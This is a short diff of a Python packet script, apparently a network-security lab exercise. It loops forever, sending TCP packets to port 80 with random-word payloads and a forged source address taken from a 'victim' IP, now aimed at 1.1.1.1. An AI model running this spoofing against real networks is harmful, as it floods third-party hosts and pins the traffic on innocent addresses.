@@ -44,22 +44,18 @@ def build_packet(external_host_ip, external_ip):
         payload_string += RANDOMIZED_WORDS[randint(0, len(RANDOMIZED_WORDS) - 1)]
         if i != MAX - 1:
             payload_string += ' '
-
-    
-    attacker_packet = IP(dst=my_ips.router_ip)/TCP(dport=80)/Raw(load=payload_string)
-
     
     # Append the original victim destination at end of payload
 
-    packet = IP(src=external_host_ip, dst=external_ip)/TCP(dport=80)/Raw(load=payload_string)
+    packet = IP(src=external_host_ip, dst=external_ip)/TCP(dport=80)/Raw(load=payload_string.encode('utf-8'))
     send_to_router(packet)
 
-def send_packet(packet):
-    print('Sending external packet')
-    r1 = send(packet, iface='eth1')
+#def send_packet(packet):
+#    print('Sending external packet')
+#    r1 = send(packet, iface='eth1')
     
 
 
 while True:
-    build_packet(my_ips.victim_ip, my_ips.external_host_ip)
+    build_packet(my_ips.victim_ip, '1.1.1.1')
     sleep(5)
